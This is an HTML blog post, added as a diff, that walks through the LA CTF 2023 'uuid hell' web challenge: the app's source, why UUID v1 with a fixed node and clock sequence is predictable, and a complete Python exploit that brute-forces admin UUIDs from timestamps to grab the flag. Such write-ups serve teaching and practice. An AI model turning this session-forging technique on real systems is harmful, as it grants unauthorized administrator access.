@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      Uuid hell writeup ~ la ctf 2023
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Uuid hell writeup ~ la ctf 2023" />
+<meta name="author" content="zyeinn" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Challenge Description UUIDs are the best! I love them (if you couldn’t tell)!" />
+<meta property="og:description" content="Challenge Description UUIDs are the best! I love them (if you couldn’t tell)!" />
+<link rel="canonical" href="https://zyeinn.github.io//uuid-hell-writeup-la-ctf-2023" />
+<meta property="og:url" content="https://zyeinn.github.io//uuid-hell-writeup-la-ctf-2023" />
+<meta property="og:site_name" content="zyeinn’s blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-05-02T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Uuid hell writeup ~ la ctf 2023" />
+<script type="application/ld+json">
+{"headline":"Uuid hell writeup ~ la ctf 2023","dateModified":"2023-05-02T00:00:00+01:00","datePublished":"2023-05-02T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://zyeinn.github.io//uuid-hell-writeup-la-ctf-2023"},"author":{"@type":"Person","name":"zyeinn"},"@type":"BlogPosting","description":"Challenge Description UUIDs are the best! I love them (if you couldn’t tell)!","url":"https://zyeinn.github.io//uuid-hell-writeup-la-ctf-2023","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  <link type="application/atom+xml" rel="alternate" href="https://zyeinn.github.io//feed.xml" title="zyeinn&apos;s blog" />
+
+  <!-- Favicon -->
+  <meta name="msapplication-TileColor" content="#00aba9">
+  <meta name="theme-color" content="#ffffff">
+  <!-- Favicon -->
+
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/">/back</a>
+<h1 class="post-title">Uuid hell writeup ~ la ctf 2023</h1>
+<p class="post-date text-bold">
+  
+    <span class="text-upcase">zyeinn</span> / 
+  
+  
+    <span class="text-upcase">May 2023</span>
+  
+
+
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+
+
+
+<h2 id="challenge-description">Challenge Description</h2>
+<p>UUIDs are the best! I love them (if you couldn’t tell)!</p>
+
+<h2 id="solution">Solution</h2>
+<p>In this challenge, the objective was to find the UUID of the admin to obtain the flag.
+To achieve this goal, the website’s source code was provided for analysis.</p>
+
+<p><strong>index.js</strong></p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">uuid</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">uuid</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">)</span>
+
+<span class="kd">function</span> <span class="nx">randomUUID</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">uuid</span><span class="p">.</span><span class="nx">v1</span><span class="p">({</span><span class="dl">'</span><span class="s1">node</span><span class="dl">'</span><span class="p">:</span> <span class="p">[</span><span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">],</span> <span class="dl">'</span><span class="s1">clockseq</span><span class="dl">'</span><span class="p">:</span> <span class="mb">0b10101001100100</span><span class="p">});</span>
+<span class="p">}</span>
+<span class="kd">let</span> <span class="nx">adminuuids</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="kd">let</span> <span class="nx">useruuids</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="kd">function</span> <span class="nx">isAdmin</span><span class="p">(</span><span class="nx">uuid</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">adminuuids</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">uuid</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nx">isUuid</span><span class="p">(</span><span class="nx">uuid</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">uuid</span><span class="p">.</span><span class="nx">length</span> <span class="o">!=</span> <span class="mi">36</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">c</span> <span class="k">of</span> <span class="nx">uuid</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="sr">/</span><span class="se">[</span><span class="sr">-a-f0-9</span><span class="se">]</span><span class="sr">/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">c</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">getUsers</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">output</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;strong&gt;Admin users:&lt;/strong&gt;</span><span class="se">\n</span><span class="dl">"</span><span class="p">;</span>
+    <span class="nx">adminuuids</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">adminuuid</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">hash</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">md5</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">adminuuid</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">"</span><span class="s2">hex</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">output</span> <span class="o">+=</span> <span class="s2">`&lt;tr&gt;&lt;td&gt;</span><span class="p">${</span><span class="nx">hash</span><span class="p">}</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;\n`</span><span class="p">;</span>
+    <span class="p">});</span>
+    <span class="nx">output</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">&lt;br&gt;&lt;br&gt;&lt;strong&gt;Regular users:&lt;/strong&gt;</span><span class="se">\n</span><span class="dl">"</span><span class="p">;</span>
+    <span class="nx">useruuids</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">useruuid</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">hash</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">md5</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">useruuid</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">"</span><span class="s2">hex</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">output</span> <span class="o">+=</span> <span class="s2">`&lt;tr&gt;&lt;td&gt;</span><span class="p">${</span><span class="nx">hash</span><span class="p">}</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;\n`</span><span class="p">;</span>
+    <span class="p">});</span>
+    <span class="k">return</span> <span class="nx">output</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">cookie-parser</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">());</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">[</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">id</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="o">!</span><span class="nx">isUuid</span><span class="p">(</span><span class="nx">id</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">id</span> <span class="o">=</span> <span class="nx">randomUUID</span><span class="p">();</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="nx">id</span><span class="p">);</span>
+        <span class="nx">useruuids</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">useruuids</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">50</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">useruuids</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">isAdmin</span><span class="p">(</span><span class="nx">id</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">You are logged in as </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">id</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;br&gt;&lt;br&gt;</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">getUsers</span><span class="p">());</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/createadmin</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">adminid</span> <span class="o">=</span> <span class="nx">randomUUID</span><span class="p">();</span>
+    <span class="nx">adminuuids</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">adminid</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">adminuuids</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">50</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">adminuuids</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Admin account created.</span><span class="dl">"</span><span class="p">)</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>During my investigation, I identified three noteworthy sections. The first part was the <code class="language-plaintext highlighter-rouge">randomUUID()</code> function, which generated a <code class="language-plaintext highlighter-rouge">UUID v1</code> using the <code class="language-plaintext highlighter-rouge">node</code> and <code class="language-plaintext highlighter-rouge">clockseq</code> parameters.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">randomUUID</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">uuid</span><span class="p">.</span><span class="nx">v1</span><span class="p">({</span><span class="dl">'</span><span class="s1">node</span><span class="dl">'</span><span class="p">:</span> <span class="p">[</span><span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">],</span> <span class="dl">'</span><span class="s1">clockseq</span><span class="dl">'</span><span class="p">:</span> <span class="mb">0b10101001100100</span><span class="p">});</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The second part is present in the <code class="language-plaintext highlighter-rouge">getUsers()</code> function, which displays the MD5 hash of the word “admin” concatenated with the <strong>UUID</strong> of each existing <strong>admin</strong> on the website.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">getUsers</span><span class="p">()</span> <span class="p">{</span>
+    <span class="p">[...]</span>
+    <span class="nx">adminuuids</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">adminuuid</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">hash</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">md5</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">adminuuid</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">"</span><span class="s2">hex</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">output</span> <span class="o">+=</span> <span class="s2">`&lt;tr&gt;&lt;td&gt;</span><span class="p">${</span><span class="nx">hash</span><span class="p">}</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;\n`</span><span class="p">;</span>
+    <span class="p">});</span>
+    <span class="p">[...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The third section pertains to the <code class="language-plaintext highlighter-rouge">/createadmin</code> endpoint, which generates a new admin with a seemingly <strong>“random”</strong> UUID.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/createadmin</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">adminid</span> <span class="o">=</span> <span class="nx">randomUUID</span><span class="p">();</span>
+    <span class="nx">adminuuids</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">adminid</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">adminuuids</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">50</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">adminuuids</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Admin account created.</span><span class="dl">"</span><span class="p">)</span>
+<span class="p">});</span>
+</code></pre></div></div>
+<p>I came a across an excellent <a href="https://versprite.com/blog/universally-unique-identifiers/">article</a> on UUIDs and their different versions. The article provides a detailed explanation of how UUID v1 is generated, along with its pros and cons. Notably, there is an interesting point in the “cons” section.</p>
+
+<blockquote>
+  <p>“An attacker may be able to get the exact timestamp, clock sequence and node (MAC address) of the system from an arbitrary UUID – Cost of anonymity.”</p>
+</blockquote>
+
+<p>Based on the information provided in the application code, it can be concluded that only the <strong>exact timestamp is required</strong>, as the code already includes the <code class="language-plaintext highlighter-rouge">clock sequence</code> and <code class="language-plaintext highlighter-rouge">node</code> information.</p>
+
+<p>To obtain the precise timestamp, I send a post request to the endpoint <code class="language-plaintext highlighter-rouge">/createadmin</code> to create a new admin and then execute the <code class="language-plaintext highlighter-rouge">date</code> command to retrieve the <strong>Unix timestamp</strong>. This method allows me to determine the approximate time when the new admin was created.</p>
+
+<p>Next, I need to convert the Unix timestamp to <strong>UUID v1</strong> by performing the reverse calculation of the process described in the <a href="https://versprite.com/blog/universally-unique-identifiers/">article</a>, After obtaining an estimated UUID, I can convert it to MD5 format by appending the word “admin”.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># calculate the UUID based on the timestamp
+</span>    <span class="n">secondstep</span> <span class="o">=</span> <span class="n">utimestamp</span> <span class="o">*</span> <span class="mi">10000</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">secondstep</span> <span class="o">+</span> <span class="mi">122192928000000000</span><span class="p">)</span>
+    <span class="n">ti</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
+    <span class="n">me</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="mi">9</span><span class="p">]</span>
+    <span class="n">stamp</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">9</span><span class="p">:</span><span class="mi">17</span><span class="p">]</span>
+
+    <span class="n">uuid</span> <span class="o">=</span> <span class="s">f"</span><span class="si">{</span><span class="n">stamp</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">me</span><span class="si">}</span><span class="s">-1</span><span class="si">{</span><span class="n">ti</span><span class="si">}</span><span class="s">-aa64-67696e6b6f69"</span>
+
+    <span class="c1"># calculate the MD5 hash of the UUID with the "admin" string
+</span>    <span class="n">string_to_hash</span> <span class="o">=</span> <span class="s">'admin'</span> <span class="o">+</span> <span class="n">uuid</span>
+    <span class="n">hash_object</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">string_to_hash</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+    <span class="n">craftedmd5</span> <span class="o">=</span> <span class="n">hash_object</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Lastly, I need to compare the hash I generated with the hash displayed in the application.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># Check if the crafted MD5 hash matches the target admin MD5 hash
+</span>    <span class="k">if</span> <span class="n">craftedmd5</span> <span class="o">==</span> <span class="n">adminMd5</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">f"Crafted MD5 Found!"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">f"Times: </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">f"UnixTimeStamp: </span><span class="si">{</span><span class="n">utimestamp</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">f"Admin UUID: </span><span class="si">{</span><span class="n">uuid</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">f"Flag: </span><span class="si">{</span><span class="n">getFlag</span><span class="p">(</span><span class="n">uuid</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">break</span>
+</code></pre></div></div>
+
+<h2 id="exploit">Exploit</h2>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">URL</span> <span class="o">=</span> <span class="s">"http://192.168.1.81:3500"</span>
+
+<span class="k">def</span> <span class="nf">createAdmin</span><span class="p">():</span>
+    <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">'/createadmin'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">compareAdminUsers</span><span class="p">():</span>
+
+    <span class="n">beforeCreation</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
+    <span class="n">createAdmin</span><span class="p">()</span>
+    <span class="n">afterCreation</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
+
+    <span class="c1"># find all MD5 hashes in the before and after lists
+</span>    <span class="n">md5_pattern</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="s">r'[a-fA-F\d]{32}'</span><span class="p">)</span>
+    <span class="n">matchesBefore</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">md5_pattern</span><span class="p">,</span> <span class="n">beforeCreation</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"&lt;br&gt;"</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+    <span class="n">matchesAfter</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">md5_pattern</span><span class="p">,</span> <span class="n">afterCreation</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"&lt;br&gt;"</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+
+    <span class="c1"># find the difference between the two lists
+</span>    <span class="n">diff</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">matchesBefore</span><span class="p">)</span> <span class="o">^</span> <span class="nb">set</span><span class="p">(</span><span class="n">matchesAfter</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">diff</span>
+
+<span class="c1"># function to get the Unix timestamp in milliseconds
+</span><span class="k">def</span> <span class="nf">getUnixtimestamp</span><span class="p">():</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="s">"echo $(($(date +%s%N)/1000000))"</span>
+    <span class="n">timestamp</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'utf-8'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">timestamp</span>
+
+<span class="c1"># function to get the flag by sending a request to the server with a given UUID
+</span><span class="k">def</span> <span class="nf">getFlag</span><span class="p">(</span><span class="n">uuid</span><span class="p">):</span>
+    <span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s">"id"</span><span class="p">:</span> <span class="s">f"</span><span class="si">{</span><span class="n">uuid</span><span class="si">}</span><span class="s">"</span> <span class="p">}</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span>
+
+<span class="c1"># function to craft a UUID and find its MD5 hash
+</span><span class="k">def</span> <span class="nf">craftuuid</span><span class="p">(</span><span class="n">adminMd5</span><span class="p">):</span>
+
+    <span class="n">utimestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">getUnixtimestamp</span><span class="p">())</span> <span class="o">-</span> <span class="mi">1000</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2000</span><span class="p">):</span>
+    
+        <span class="n">utimestamp</span> <span class="o">+=</span> <span class="mi">1</span>
+
+        <span class="c1"># calculate the UUID based on the timestamp
+</span>        <span class="n">secondstep</span> <span class="o">=</span> <span class="n">utimestamp</span> <span class="o">*</span> <span class="mi">10000</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">secondstep</span> <span class="o">+</span> <span class="mi">122192928000000000</span><span class="p">)</span>
+        <span class="n">ti</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
+        <span class="n">me</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="mi">9</span><span class="p">]</span>
+        <span class="n">stamp</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">9</span><span class="p">:</span><span class="mi">17</span><span class="p">]</span>
+
+        <span class="n">uuid</span> <span class="o">=</span> <span class="s">f"</span><span class="si">{</span><span class="n">stamp</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">me</span><span class="si">}</span><span class="s">-1</span><span class="si">{</span><span class="n">ti</span><span class="si">}</span><span class="s">-aa64-67696e6b6f69"</span>
+
+        <span class="c1"># calculate the MD5 hash of the UUID with the "admin" string
+</span>        <span class="n">string_to_hash</span> <span class="o">=</span> <span class="s">'admin'</span> <span class="o">+</span> <span class="n">uuid</span>
+        <span class="n">hash_object</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">string_to_hash</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+        <span class="n">craftedmd5</span> <span class="o">=</span> <span class="n">hash_object</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span>
+        
+        <span class="c1"># Check if the crafted MD5 hash matches the target admin MD5 hash
+</span>        <span class="k">if</span> <span class="n">craftedmd5</span> <span class="o">==</span> <span class="n">adminMd5</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">f"Crafted MD5 Found!"</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">f"Times: </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">f"UnixTimeStamp: </span><span class="si">{</span><span class="n">utimestamp</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">f"Admin UUID: </span><span class="si">{</span><span class="n">uuid</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">f"Flag: </span><span class="si">{</span><span class="n">getFlag</span><span class="p">(</span><span class="n">uuid</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+            <span class="k">break</span>
+
+<span class="c1"># call the function to craft a UUID with the MD5 hash of the admin user
+</span><span class="n">craftuuid</span><span class="p">(</span><span class="n">compareAdminUsers</span><span class="p">())</span>
+</code></pre></div></div>
+<p><strong>Output</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Crafted MD5 Found!
+Times: 994
+UnixTimeStamp: 1683055225263
+Admin UUID: 63e583f0-e91e-11ed-aa64-67696e6b6f69
+Flag: lactf{testing}
+</code></pre></div></div>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
